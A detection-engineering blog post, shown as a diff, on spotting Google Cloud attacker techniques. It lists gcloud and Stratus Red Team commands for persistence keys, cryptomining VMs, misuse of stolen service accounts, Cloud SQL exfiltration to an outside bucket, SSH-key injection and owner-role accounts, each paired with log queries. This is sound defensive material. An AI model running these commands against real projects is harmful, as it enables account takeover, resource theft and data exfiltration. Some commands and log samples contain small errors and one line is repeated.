@@ -1,0 +1,303 @@
+
+If you have all the details of a thousand misdeeds at your finger ends, it is odd if you can’t unravel the thousand and first. —Sir Arthur Conan Doyle, "A Study in Scarlet"
+As detection engineers or security analysts, we like to think of ourselves as detectives, peering into every log to determine if an activity is bad or not—hence starting this blog post with a Sherlock Holmes reference. Just as Holmes aims to understand what a criminal might do next by evaluating the "thousand misdeeds" he already knows. By studying known threat activity, we can guide our efforts in the development of threat detection content.
+In this post, we’ll highlight some of our security research team’s key findings when it comes to common threats and exploits in Google Cloud. Our hope is that security teams can use this information to create detections that will catch the early signs of attacker activity and help their organization stay ahead of threats.
+Threat modeling
+The MITRE ATT&CK cloud framework provides a representation of the attacker life cycle in a cloud environment, and we can use this framework to classify the attacker behaviors we detect based on their intentions.
+We incorporate community-derived research and threat hunting methods into our process for developing threat detections for Google Cloud, we break down the detections laid out in this post into these categories:
+
+Known knowns: These are techniques known to have been used in the wild. They include behaviors, tooling, and threat indicators that we can connect back to a known threat actor, campaign, or malware. With these detections, we can have a high degree of confidence that we will be catching actual attacker behavior.
+Unknown knowns: These are techniques that are likely to have been used in the wild. They include behaviors or tooling derived from research into red-team engagements, available security research, and penetration testing methodologies. Building detections based on this evidence allows us to enhance our coverage of cloud platforms by covering more potential avenues for threats.
+Known knowns
+Service account key creation
+
+	
+Tactic	TA0003- Persistence
+Technique	T1098.001 - Account Manipulation: Additional Cloud Credentials
+Data source	Google Cloud audit logs
+The creation of a service account key allows an attacker to maintain access to a Google Cloud project. In an example incident highlighted by Unit42, attackers compromised the default Google App Engine service account and were able to maintain their access by creating multiple service account keys. Expel also recorded a similar incident, in which an attacker tried to create service account keys to maintain access.
+Testing a technique to identify the relevant logs for detection is part of the detection lifecycle. We try to use different methods of testing—e.g., through the Google Cloud console, gcloud CLI, or any offensive tooling that is available. We do this to discern if there’s any difference in behavior between the common methods an attacker might use. These differences often become evident when you recreate techniques in different tools, where there may be hardcoded values specific to each tool that you can use to create higher-confidence detections.
+For this use case, we will carry out the following steps:
+
+Create a service account
+Create a key for the service account
+Delete the service account when we are finished testing
+Stratus Red Team can automate this process, reducing the time teams need to spend creating resources. See the screenshots below for an example of creating a service account key using Stratus Red Team (note that we are using Google Cloud logging for this blog post to avoid naming conventions that are unique to specific SIEMs):
+$ stratus detonate gcp.persistence.create-service-account-key
+2023/03/09 10:23:14 Checking your authentication against GCP
+2023/03/09 10:23:14 Creating service account key on service account stratus-red-team-csak-sa@<REDACTED>.iam.gserviceaccount.com
+2023/03/09 10:23:15 Service account key successfully created!
+2023/03/09 10:23:15 Service account key data:
+{
+ "type": "service_account",
+ "project_id": "<REDACTED>",
+ "private_key_id": "<REDACTED>",
+ "private_key": "-----BEGIN PRIVATE KEY-----\n<REDACTED>\n-----END PRIVATE KEY-----\n",
+ "client_email": "stratus-red-team-csak-sa@<REDACTED>.iam.gserviceaccount.com",
+ "client_id": "116662640479263667459",
+ "auth_uri": "https://accounts.google.com/o/oauth2/auth",
+ "token_uri": "https://oauth2.googleapis.com/token",
+ "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
+ "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/stratus-red-team-csak-sa%40<REDACTED>.iam.gserviceaccount.com"
+}
+JSON log output:
+{
+ "protoPayload": {
+   ...
+   "serviceName": "iam.googleapis.com",
+   "methodName": "google.iam.admin.v1.CreateServiceAccountKey",
+   ...
+   "request" : {
+       "name": "projects/-/serviceAccounts/stratus-red-team-csak-sa@<REDACTED>.iam.gserviceaccount.com",
+   },
+   "response": {
+      "name": "projects/<REDACTED>/serviceAccounts/stratus-red-team-csak-sa@<REDACTED>.iam.gserviceaccount.com/keys/111111111111111"
+    }
+}
+}
+Searching your logs for the fields outlined below should allow you to detect this activity. However, it will also capture benign activity, and that’s why we look to adding additional context indicators to improve the confidence of our alert if we see a high level of false positives. While adding context will improve the confidence of the detection, it also means that you could have some false negatives, so you’ll need to weigh these varying risks.
+protoPayload.methodName=~"google.iam.admin.v\d.CreateServiceAccountKey"
+protoPayload.serviceName="iam.googleapis.com"
+Note the use of regex in these fields to ensure you do not lose coverage when Google updates their API version.
+
+Enriched IP addresses: Is the activity coming from a known VPN, an anonymized service such as TOR, or a country or Autonomous System Number (ASN) that your organization has not seen before?
+Dormant service account: If a change is made to a non-active service account, this may be an interesting event to investigate. The definition of dormant will be different in each organization. As an example, it may be a service account that has not been used in 30 days.
+Google Cloud Compute Engine—GPU-based VM creation
+
+	
+Tactic	TA0040 - Impact
+Technique	T1496 - Resource Hijacking
+Data source	Google Cloud audit logs
+The GCAT Threat Horizon report from October 2022 found that nearly two thirds of incidents (65 percent) included cryptomining. In addition, a Unit42 report details the use of a service account to spin up more than 1,600 GPU-based virtual machines (VMs) across multiple regions in order to mine cryptocurrency. With this information, security analysts can design a detection looking for the anomalous creation of GPU-based VMs.
+In order to validate this behavior, start by creating one GPU-based VM instance using gcloud or the Google Cloud console. Following the creation of the instance, you can delete it to prevent incurring further costs.
+Here’s what the process looks like using gcloud:
+$ gcloud compute instances create gpu-test-instance \
+    --machine-type n1-standard-2 \
+    --zone europe-west1-b \
+    --boot-disk-size 40GB \
+    --accelerator type=nvidia-tesla-p100,count=1 \
+    --image-family debian-10 \
+    --image-project debian-cloud \
+    --maintenance-policy TERMINATE --restart-on-failure \
+    --network default \
+    --subnet default
+
+
+NAME               ZONE            MACHINE_TYPE   PREEMPTIBLE  INTERNAL_IP  EXTERNAL_IP   STATUS
+gpu-test-instance  europe-west1-b  n1-standard-2               10.132.0.2   <PUBLIC IP>  RUNNING
+JSON log output:
+{
+ "protoPayload": {
+   "serviceName": "compute.googleapis.com",
+   "methodName": "v1.compute.instances.insert",
+    "request": {
+      "guestAccelerators": [
+       {
+         "acceleratorCount": "1",
+         "acceleratorType": "https://compute.googleapis.com/compute/v1/projects/<REDACTED>/zones/europe-west1-b/acceleratorTypes/nvidia-tesla-p100"
+       }
+     ],
+     "name": "gpu-test-instance",
+   },
+ },
+ "timestamp": "2023-02-21T11:40:35.985380Z"
+ }
+When you’ve identified the relevant logs, run the following command to clean up the instance you created:
+$ gcloud compute instances delete gpu-test-instance --zone=europe-west1-b
+The fields below should allow you to detect this activity in your logs.
+protoPayload.methodName="beta.compute.instances.insert" OR protoPayload.methodName=~"v\d.compute.instances.insert"
+protoPayload.request.guestAccelerators.acceleratorCount=~".*"
+protoPayload.serviceName="compute.googleapis.com"
+The severity you assign to this detection will depend on the organization(s) you are designing it for—some never use GPUs, and as such, any creation of a GPU-based VM may be of interest to them. Meanwhile, other organizations may have an infrastructure that is mostly GPU-based; in this case, looking at thresholds or anomalous behavior within a time window may be fruitful (e.g., 100 instances within 5 minutes).
+
+Enriched IP addresses: Is the activity coming from a known VPN, an anonymized service such as TOR, or a country or ASN that your organization has not seen before?
+Unused regions or new machine types: Attackers often generate VM instances in multiple regions to evade detection. If your engineering teams have guidelines about regions or machine types and you spot instances that are outside these parameters, this may be an indicator of attack.
+Use of default service accounts outside of Google Cloud
+
+	
+Tactic	TA0006-credential-access
+Technique	T1552-005-unsecured-credentials-cloud-instance-metadata-api
+Data source	Google Cloud audit logs
+A Google Cloud service account is an identity within Google Cloud that is typically used by a specific application or resource rather than a person. Unlike the usual user accounts that represent individuals, a service account is generally intended to grant applications secure access to Google Cloud resources and APIs, without manual intervention by users.
+By default, App Engine, Compute Engine, and any Google Cloud service that uses either of these services use a default service account. The usage of a default service account from outside Google Cloud IP address space could be a strong indicator that a service account has been compromised.
+The impact of an attacker gaining access to service accounts can be significant. In an example documented by Unit42, an attacker used a compromised App Engine service account from a Tor exit node to perform various nefarious actions, including the creation of over 1,600 virtual machines (using methods we described earlier in the service account key creation detection).
+For this use case, we will be performing the below activities from an EC2 instance:
+
+Create a key for an existing Compute Engine service account
+$ gcloud iam service-accounts keys create evilkey -iam-account=PROJECT_NUMBER-compute@developer.gserviceaccount.com
+
+created key [d37201a421badf733b29c070175528508040cb91] of type [json] as [evilkey] for [PROJECT_NUMBER-compute@developer.gserviceaccount.com]
+JSON log output:
+"protoPayload": {
+   ...
+   "serviceName": "iam.googleapis.com",
+   "methodName": "google.iam.admin.v1.CreateServiceAccountKey",
+   "request" : {
+      "name": "projects/-/serviceAccounts/PROJECT_NUMBER-compute@developer.gserviceaccount.com",
+   },
+   "response":
+    {
+      "name": "projects/<REDACTED>/serviceAccounts/PROJECT_NUMBER-compute@developer.gserviceaccount.com/keys/441eac052af9b4d29f2e5e13bd94a29098066b28"
+    }
+ }
+
+Activate the service account for gcloud using the created key file
+$ gcloud auth activate-service-account --project=testproject --key-file=test
+
+Activated service account credentials for: [PROJECT_NUMBER-compute@developer.gserviceaccount.com]
+
+Authenticate into Google Cloud using the service account
+$ gcloud auth login PROJECT_NUMBER-compute@developer.gserviceaccount.com
+
+CLI Output:
+WARNING: Re-using locally stored credentials for [PROJECT_NUMBER-compute@developer.gserviceaccount.com]. To fetch new credentials, re-run the command with the `--force` flag.
+
+Authenticated with service account credentials for: [PROJECT_NUMBER-compute@developer.gserviceaccount.com].
+Your current project is [<YOUR-PROJECT>].  You can change this setting by running:
+  $ gcloud config set project PROJECT_ID
+
+Make a test API call—storage buckets enumeration
+gcloud storage ls
+JSON log output:
+"protoPayload": {
+  ...
+   "serviceName": "storage.googleapis.com",
+   "methodName": "storage.buckets.list",
+ }
+Run the following command to find and disable the service account key after you have identified the relevant logs:
+
+Find service account key
+$ gcloud iam service-accounts keys list --iam-account
+PROJECT_NUMBER-compute@developer.gserviceaccount.com
+
+Deactivate key
+$ gcloud iam service-accounts keys disable 441eac052af9b4d29f2e5e13bd94a29098066b28 --iam-account=PROJECT_NUMBER-compute@developer.gserviceaccount.com
+
+Delete key
+$ gcloud iam service-accounts keys delete 441eac052af9b4d29f2e5e13bd94a29098066b28 --iam-account=PROJECT_NUMBER-compute@developer.gserviceaccount.com
+protoPayload.authenticationInfo.principalEmail=~".*-compute@developer.gserviceaccount.com" OR protoPayload.authenticationInfo.principalEmail=~".*@appspot.gserviceaccount.com"
+-protoPayload.requestMetadata.callerSuppliedUserAgent:"GCE"
+In this case, the service account used in the query will be unique to your environment’s default compute service account. The exclusion of user agents containing "GCE" narrows down the results by excluding data from Google Cloud Compute Instances. For better context, you can further enrich this data by excluding logs from Google or Google Cloud domains and internal IPs, as well as by looking to see if the source IP is from a VPN, an anonymized source, or even a different cloud environment.
+Unknown knowns
+Exfiltration of data via Google Cloud SQL
+
+	
+Tactic	TA0010 - Exfiltration
+Technique	T1537 - Transfer Data to Cloud Account
+Data source	Google Cloud Data access logs
+An article from GitLab details how you can successfully exfiltrate data from a Google Cloud SQL database or instance to Cloud Storage in a different project. Using this technique, an attacker with the correct level of access could exfiltrate sensitive information from a victim to an attacker-controlled project. Looking at Google’s Cloud SQL documentation, we can discern the relevant information that would allow us to export a SQL instance to a cloud storage device.
+
+Create SQL instance
+$ gcloud sql instances create exfil-instance --database-version=MYSQL_5_7 --cpu=2 --memory=4GB --region=us-central1 --root-password=password123
+
+Create SQL database instance
+$ gcloud sql databases create exfil-db --instance=exfil-instance
+
+Export instance to external cloud storage device
+$ gcloud sql export sql exfil-instance gs://exfil-bucket/sqldumpfile.gz \ 
+--database=exfil-db \
+--offload
+
+You may need to add the service account from the database instance to your cloud storage bucket with the following permissions on the resource:
+storage.objects.create
+JSON log output:
+"protoPayload": {
+   "serviceName": "cloudsql.googleapis.com",
+   "methodName": "cloudsql.instances.export",
+    "request": {
+     "project": "<REDACTED>",
+     "body": {
+       "exportContext": {
+         "uri": "gs://exfil-bucket/Cloud_SQL_Export_2023-02-28 (11:37:54).sql",
+         "fileType": "SQL"
+       }
+     },
+     "instance": "exfil-instance"
+   }
+ }
+You can perform cleanup by running the following command to delete the database you created:
+$ gcloud sql databases delete <DATABASE> -i <INSTANCE>
+protoPayload.methodName="cloudsql.instances.export"
+protoPayload.serviceName="cloudsql.googleapis.com"
+protoPayload.request.body.exportContext.uri=~"gs://.*"
+
+Enriched IP addresses:  Is the activity coming from a known VPN, an anonymized service such as TOR, or a country or ASN that your organization has not seen before?
+Exclude known storage buckets: Use a lookup table or equivalent to filter out  known storage buckets, so that any events left would only include buckets that do not belong to your organization.
+Google Compute Engine project metadata SSH key addition or modification
+
+	
+Tactic	TA0008 - Lateral Movement / TA0003 - Persistence
+Technique	T1098.004 - Account Manipulation: SSH Authorized Keys
+Data source	Google Cloud audit logs
+An attacker who has already gained initial access may try to preserve access or laterally move to other GCE instances by adding their SSH key to the compute project metadata. This technique was recorded by Brad Richardson and Madhav Bhatt during their talk at BSIDEs SF 2022.
+
+Create SSH key
+Add SSH key to project metadata
+
+If you are doing this with the gcloud command, be sure to follow the guide to avoid erasing existing SSH keys.
+
+If you are doing this with the gcloud command, be sure to follow the guide to avoid erasing existing SSH keys.
+If you need to remove a specific key for cleanup, we recommend doing this via the console to avoid erasing all keys.
+{
+ "protoPayload": {
+   "serviceName": "compute.googleapis.com",
+   "methodName": "v1.compute.projects.setCommonInstanceMetadata",
+   "resourceName": "projects/<REDACTED>",
+    "metadata": {
+     "@type": "type.googleapis.com/google.cloud.audit.GceProjectAuditMetadata",
+     "projectMetadataDelta": {
+       "modifiedMetadataKeys": [
+         "ssh-keys"
+       ]
+     }
+   }
+ }
+}
+protoPayload.methodName=~"v*.compute.projects.setCommonInstanceMetadata"
+protoPayload.serviceName="compute.googleapis.com"
+protoPayload.metadata.projectMetadataDelta.modifiedMetadataKeys="ssh-keys" OR protoPayload.metadata.instanceMetadataDelta.addedMetadataKeys="ssh-keys"
+
+Enriched IP addresses: Is the activity coming from a known VPN, an anonymized service such as TOR, or a country or ASN that your organization has not seen before?
+Creation of a privileged service account
+
+	
+Tactic	TA0004 - Privilege Escalation / TA0003 - Persistence
+Technique	T1136.003 - Create Account: Cloud Account
+Data source	Google Cloud audit logs
+An attacker could create a highly-privileged service account with the Owner role, which gives complete administrative access over the compromised Google Cloud project.
+For this use case, we will carry out the following:
+
+Create a service account
+Add an owner role binding to the service account
+Delete the service account
+Stratus Red team can automate this process, as displayed below:
+$ stratus detonate gcp.persistence.create-admin-service-account
+2023/03/09 12:55:04 Checking your authentication against GCP
+2023/03/09 12:55:04 Warming up gcp.persistence.create-admin-service-account
+2023/03/09 12:55:04 Initializing Terraform to spin up technique prerequisites
+2023/03/09 12:55:06 Applying Terraform to spin up technique prerequisites
+2023/03/09 12:55:06 Creating service account stratus-red-team-casa-sa-unzr
+2023/03/09 12:55:07 Successfully created service account stratus-red-team-casa-sa-unzr@<REDACTED>.iam.gserviceaccount.com
+2023/03/09 12:55:08 Adding the service account to an existing binding in the project's IAM policy to grant roles/owner
+{
+ "protoPayload": {
+    "serviceName": "iam.googleapis.com",
+    "methodName": "google.iam.admin.v1.CreateServiceAccount",
+    "request" : {
+      "name": "projects/-/serviceAccounts/1111111"
+    },
+    "response": {
+      "name": "projects/<REDACTED>/serviceAccounts/stratus-red-team-casa-sa-unzr@<REDACTED>.iam.gserviceaccount.com/keys/111111111111111"
+    },
+  }
+  "resource": {
+      "type": "service_account" 
+    }
+ }
+resource.type="service_account"
+protoPayload.methodName="google.iam.admin.v1.CreateServiceAccount"
+protoPayload.serviceName="iam.googleapis.com"
+Conclusion
+In this post, we discussed some ideas for Google Cloud threat detection based on known and potential threats. For any security analysts or detection engineers dipping their toes into the world of Google Cloud threat detection, we hope this post will help you in the development of any new detection content.
+
+If you are doing this with the gcloud command, be sure to follow the guide to avoid erasing existing SSH keys.
